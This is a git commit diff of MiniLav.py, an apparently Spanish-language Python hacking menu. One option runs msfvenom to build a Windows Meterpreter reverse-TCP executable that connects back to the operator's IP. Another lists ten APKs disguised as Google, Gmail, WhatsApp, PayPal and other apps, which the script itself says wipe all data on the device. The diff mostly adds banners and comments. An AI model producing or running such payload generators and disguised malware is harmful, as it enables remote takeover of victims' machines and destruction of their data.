731cadc253b81e64cfec4e7781533fc5cd74ba39
74lg0 <111157836+74lg0@users.noreply.github.com>
2022-12-12 17:16:43 -0600

    Update MiniLav.py

--- MiniLav.py
+++ MiniLav.py
@@ -115,11 +115,13 @@ if eleccion == 1:
     print("Nota:El archivo solo funciona para windows")
     print("------------------------------------------")
     print("Jenerando archivo...")
-    eleccionmeta=input(Fore.GREEN+ "Ingresa tu IP privada: ")
-    eleccionmeta2=input("Ingresa el nombre del archivo junto con el nombre de su extencion --> .exe ")
-    system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + eleccionmeta + " LPORT=4444 -f exe >" + eleccionmeta2)
+    eleccionmeta=input(Fore.GREEN+ "Ingresa tu IP privada: ")#<-------Direccion IP privada
+    
+    eleccionmeta2=input("Ingresa el nombre del archivo junto con el nombre de su extencion --> .exe ")#<-------Nombre del archivo
+    
+    system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + eleccionmeta + " LPORT=4444 -f exe >" + eleccionmeta2)#<-------Jenerando archivo...
 
-#----------------Options2----------
+#----------------Options2 and banner3--------------------
 
 elif eleccion == 2:
     system("clear")
@@ -150,17 +152,26 @@ elif eleccion == 2:
     print(Fore.RED+ "       -_~-,       ` `   ./")
     print("           {_            )")
     print("             ^^\..___,.--")
-
-
-
-
-    print(Fore.RED+ "[1]" + Fore.YELLOW+ "Google.apk" , Fore.RED+ "\n[2]" + Fore.YELLOW+ "PlayStore.apk" , Fore.RED+ "\n[3]"+ Fore.YELLOW+ "Termux.apk")
+    
+    #--------------15 archivoz-----------------
+ 
+    print(Fore.BLUE+ "\n!!!ATENCION ESTOS VIRUZ ELIMINAN TODA LA INFORMACION DE LOS DISPOSITIVOZ!!!" , "\n-----------los archivoz fueron tomados de otro script (papaviruz)----------")
+    print(Fore.RED+ "\n[1]" + Fore.YELLOW+ "Google.apk" , Fore.RED+ "\n[2]" + Fore.YELLOW+ "PlayStore.apk" , Fore.RED+ "\n[3]"+ Fore.YELLOW+ "Termux.apk" , Fore.RED+ "\n[4]" , Fore.YELLOW+ "Galeria.apk" , Fore.RED+ "\n[5]" , Fore.YELLOW+ "Gmail.apk" , Fore.RED+ "\n[6]" , Fore.YELLOW+ "Whatsapp Espia.apk" , Fore.RED+ "\n[7]" , Fore.YELLOW+ "Camara.apk" , Fore.RED+ "\n[8]" + Fore.YELLOW+ "Internet gratis.apk" , Fore.RED+ "\n[9]" , Fore.YELLOW+ "Whatsapp lite.apk" , Fore.RED+ "\n[10]" + Fore.YELLOW+ "PayPal.apk")
+    
     eleccionarch=input(Fore.RED+ "~~Elige una opcion: ")
 
 #-------Options2 and opcion1-------
     
     if eleccionarch == "1":
         system("clear")
+        
+        print(Fore.BLUE+" _                                                     _")#<--------Banner------
+        print("/ \    /\         __                          _   __  /_/ __")
+        print("| |\  / | _____   \ \            ___   _____ | | /  \ _   \ \ ")
+        print("| | \/| | | ___\ |- -|   /\     / __\ | -__/ | || | || | |- -|")
+        print("|_|   | | | _|__  | |_  / -\  __\ \   | |    | | \__/| |  | |_")
+        print("      |/  |____/  \___\/ /\ \ \___/   \/     \__|    |_\  \___\ ")
+
         print("")
         elecciondirectorio=input(Fore.YELLOW+ "Mover a: ")
         print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio)
@@ -169,6 +180,14 @@ elif eleccion == 2:
 
     elif eleccionarch == "2":
         system("clear")
+        
+        print(Fore.BLUE+" _                                                     _")#<--------Banner------
+        print("/ \    /\         __                          _   __  /_/ __")
+        print("| |\  / | _____   \ \            ___   _____ | | /  \ _   \ \ ")
+        print("| | \/| | | ___\ |- -|   /\     / __\ | -__/ | || | || | |- -|")
+        print("|_|   | | | _|__  | |_  / -\  __\ \   | |    | | \__/| |  | |_")
+        print("      |/  |____/  \___\/ /\ \ \___/   \/     \__|    |_\  \___\ ")
+        
         print("")
         elecciondirectorio1=input(Fore.YELLOW+ "Mover a: ")
         print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio1)
@@ -177,19 +196,144 @@ elif eleccion == 2:
 
     elif eleccionarch == "3":
         system("clear")
+        print(Fore.BLUE+" _                                                     _")#<--------Banner------
+        
+        print("/ \    /\         __                          _   __  /_/ __")
+        print("| |\  / | _____   \ \            ___   _____ | | /  \ _   \ \ ")
+        print("| | \/| | | ___\ |- -|   /\     / __\ | -__/ | || | || | |- -|")
+        print("|_|   | | | _|__  | |_  / -\  __\ \   | |    | | \__/| |  | |_")
+        print("      |/  |____/  \___\/ /\ \ \___/   \/     \__|    |_\  \___\ ")
+
+        print("")
+        elecciondirectorio2=input(Fore.YELLOW+ "Mover a: ")
+        print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio2)
+#-----Options3 and Options4----------
+
+    elif eleccionarch == "4":
+        system("clear")
+        print(Fore.BLUE+"\n _                                                     _")#<--------Banner------
+        print("/ \    /\         __                          _   __  /_/ __")
+        print("| |\  / | _____   \ \            ___   _____ | | /  \ _   \ \ ")
+        print("| | \/| | | ___\ |- -|   /\     / __\ | -__/ | || | || | |- -|")
+        print("|_|   | | | _|__  | |_  / -\  __\ \   | |    | | \__/| |  | |_")
+        print("      |/  |____/  \___\/ /\ \ \___/   \/     \__|    |_\  \___\ ")
         print("")
         elecciondirectorio2=input(Fore.YELLOW+ "Mover a: ")
         print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio2)
 
+#-----Options3 and Options5---------
+
+    elif eleccionarch == "5":
+        system("clear")
+        print(Fore.BLUE+"\n _                                                     _")#<--------Banner------
+        print("/ \    /\         __                          _   __  /_/ __")
+        print("| |\  / | _____   \ \            ___   _____ | | /  \ _   \ \ ")
+        print("| | \/| | | ___\ |- -|   /\     / __\ | -__/ | || | || | |- -|")
+        print("|_|   | | | _|__  | |_  / -\  __\ \   | |    | | \__/| |  | |_")
+        print("      |/  |____/  \___\/ /\ \ \___/   \/     \__|    |_\  \___\ ")
+        print("")
+        elecciondirectorio2=input(Fore.YELLOW+ "Mover a: ")
+        print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio2)
+
+#-----Options3 and Options6---------
+
+    elif eleccionarch == "6":
+        system("clear")
+        print(Fore.BLUE+"\n _                                                     _")#<--------Banner------
+        print("/ \    /\         __                          _   __  /_/ __")
+        print("| |\  / | _____   \ \            ___   _____ | | /  \ _   \ \ ")
+        print("| | \/| | | ___\ |- -|   /\     / __\ | -__/ | || | || | |- -|")
+        print("|_|   | | | _|__  | |_  / -\  __\ \   | |    | | \__/| |  | |_")
+        print("      |/  |____/  \___\/ /\ \ \___/   \/     \__|    |_\  \___\ ")
+        print("")
+        elecciondirectorio2=input(Fore.YELLOW+ "Mover a: ")
+        print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio2)
+
+#-----Options3 and Options7-------------------
+
+    elif eleccionarch == "7":
+        system("clear")
+        print(Fore.BLUE+"\n _                                                     _") #<--------Banner------
+        print("/ \    /\         __                          _   __  /_/ __")
+        print("| |\  / | _____   \ \            ___   _____ | | /  \ _   \ \ ")
+        print("| | \/| | | ___\ |- -|   /\     / __\ | -__/ | || | || | |- -|")
+        print("|_|   | | | _|__  | |_  / -\  __\ \   | |    | | \__/| |  | |_")
+        print("      |/  |____/  \___\/ /\ \ \___/   \/     \__|    |_\  \___\ ")
+        print("")
+        elecciondirectorio2=input(Fore.YELLOW+ "Mover a: ")
+        print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio2)
+        
+#-----Options3 and Options8----------
+
+    elif eleccionarch == "8":
+        system("clear")
+        print(Fore.BLUE+"\n _                                                     _")#<--------Banner------
+        print("/ \    /\         __                          _   __  /_/ __")
+        print("| |\  / | _____   \ \            ___   _____ | | /  \ _   \ \ ")
+        print("| | \/| | | ___\ |- -|   /\     / __\ | -__/ | || | || | |- -|")
+        print("|_|   | | | _|__  | |_  / -\  __\ \   | |    | | \__/| |  | |_")
+        print("      |/  |____/  \___\/ /\ \ \___/   \/     \__|    |_\  \___\ ")
+        print("")
+        elecciondirectorio2=input(Fore.YELLOW+ "Mover a: ")
+        print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio2)
+
+#-----Options3 and Options9----------
+
+    elif eleccionarch == "9":
+        system("clear")
+        print(Fore.BLUE+"\n _                                                     _")#<--------Banner------
+        print("/ \    /\         __                          _   __  /_/ __")
+        print("| |\  / | _____   \ \            ___   _____ | | /  \ _   \ \ ")
+        print("| | \/| | | ___\ |- -|   /\     / __\ | -__/ | || | || | |- -|")
+        print("|_|   | | | _|__  | |_  / -\  __\ \   | |    | | \__/| |  | |_")
+        print("      |/  |____/  \___\/ /\ \ \___/   \/     \__|    |_\  \___\ ")
+        print("")
+        elecciondirectorio2=input(Fore.YELLOW+ "Mover a: ")
+        print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio2)
+
+#<-----Options3 and Options10---------
+
+    elif eleccionarch == "10":
+        system("clear")
+        print(Fore.BLUE+"\n _                                                     _")#<--------Banner------
+        print("/ \    /\         __                          _   __  /_/ __")
+        print("| |\  / | _____   \ \            ___   _____ | | /  \ _   \ \ ")
+        print("| | \/| | | ___\ |- -|   /\     / __\ | -__/ | || | || | |- -|")
+        print("|_|   | | | _|__  | |_  / -\  __\ \   | |    | | \__/| |  | |_")
+        print("      |/  |____/  \___\/ /\ \ \___/   \/     \__|    |_\  \___\ ")
+        print("")
+        elecciondirectorio2=input(Fore.YELLOW+ "Mover a: ")
+        print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio2)
+
+
 #---------Invalid Options----------
     
     else:
+        
         print("Elije una opcion valida...")
 
 #---------Invalid Options----------
 
 else:
     system("clear")
-    print("")
-    print("")
-    print(Fore.YELLOW+ "elije una opcion valida y vuelve a intentarlo" , Fore.BLUE+ "\n:>")
+    print(Fore.RED+ "\n      .:okOOOkdc'           'cdkOOOko:.")#<--------Banner for invalid options---------
+    print("    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.")
+    print("   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:")
+    print("  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'")
+    print("  oOOOOOOOO.     oOOOOoOOOOl.    ,OOOOOOOOo")
+    print("  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx")
+    print("  lOOOOOOOO.         ;d;         ,OOOOOOOOl")
+    print("  .OOOOOOOO.   .;           ;    ,OOOOOOOO.")
+    print("   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc")
+    print("    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo")
+    print("     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl")
+    print("      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;")
+    print("       .dOOo   .OOOOocccxOOOO.   xOOd.")
+    print("         ,kOl  .OOOOOOOOOOOOO. .dOk,")
+    print("          :kk;.OOOOOOOOOOOOO.cOk:")
+    print("            ;kOOOOOOOOOOOOOOOk:")
+    print("              ,xOOOOOOOOOOOx,")
+    print("                .lOOOOOOOl.")
+    print("                   ,dOd,")
+    print("                     .")
+    print(Fore.YELLOW+ "elije una opcion valida y vuelve a intentarlo" , Fore.BLUE+ ":>")
